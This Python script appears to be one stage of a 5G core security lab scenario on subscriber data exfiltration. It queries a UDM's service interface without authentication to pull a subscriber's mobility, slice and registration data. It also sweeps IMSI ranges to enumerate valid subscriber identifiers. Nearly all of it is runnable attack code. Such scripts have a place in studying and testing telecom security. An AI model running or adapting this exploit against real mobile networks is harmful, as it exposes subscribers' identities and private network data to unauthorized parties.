#!/usr/bin/env python3
"""
Stage 6 — Gather Subscriber Information (UDM query)
Scenario 2: Subscriber Data Exfiltration

Goal: enumerate subscriber data directly via UDM's SBI, using only
network reachability - no prior auth or foothold, since UDM (like
NRF in Scenario 1) performs no caller authorization.
"""

import subprocess
import json

UDM_ADDRESS = "192.168.134.128"
UDM_PORT = 7778
SUPI = "imsi-999700000000001"  # known from earlier subscriber provisioning

def curl_json(method, target_url):
    cmd = ["curl", "-s", "-w", "\n%{http_code}", "--http2-prior-knowledge",
           "-X", method, target_url]
    result = subprocess.run(cmd, capture_output=True, text=True)
    output = result.stdout.strip()
    *body_lines, status_code = output.rsplit("\n", 1)
    response_body = "\n".join(body_lines)
    try:
        parsed = json.loads(response_body) if response_body else None
    except json.JSONDecodeError:
        parsed = None
    return int(status_code), parsed


def query(label, path):
    url = f"http://{UDM_ADDRESS}:{UDM_PORT}{path}"
    status, body = curl_json("GET", url)
    print(f"[*] {label}")
    print(f"    URL: {url}")
    print(f"    Status: {status}")
    if body:
        print(f"    Response: {json.dumps(body, indent=2)}")
    else:
        print(f"    (no parseable JSON body)")
    print()
    return status, body


def main():
    print(f"[*] Stage 6 - UDM Subscriber Data Query")
    print(f"[*] Target: {UDM_ADDRESS}:{UDM_PORT}")
    print(f"[*] SUPI: {SUPI}\n")

    query("Access & Mobility subscription data", f"/nudm-sdm/v2/{SUPI}/am-data")
    query("Slice (NSSAI) subscription data", f"/nudm-sdm/v2/{SUPI}/nssai")
    query("3GPP access registration context", f"/nudm-uecm/v1/{SUPI}/registrations/amf-3gpp-access")

    # Enumeration check: does UDM behave differently for a SUPI that
    # doesn't exist vs one that does? Distinguishable errors would let
    # an attacker enumerate valid subscriber identifiers.
    enumerate_range(0, 5)  # sweeps .000000 through .000004
    print("[*] Enumeration check - querying a non-existent SUPI:")
    query("Non-existent subscriber am-data", "/nudm-sdm/v2/imsi-999700000099999/am-data")

def enumerate_range(start, count):
    print(f"[*] IMSI enumeration sweep: {count} candidates starting from {start}\n")
    base = 999700000000000  # PLMN prefix (999/70) + MSIN space
    for i in range(count):
        candidate_imsi = f"imsi-{base + start + i}"
        status, body = query(f"Candidate {candidate_imsi}", f"/nudm-sdm/v2/{candidate_imsi}/am-data")

if __name__ == "__main__":
    main()
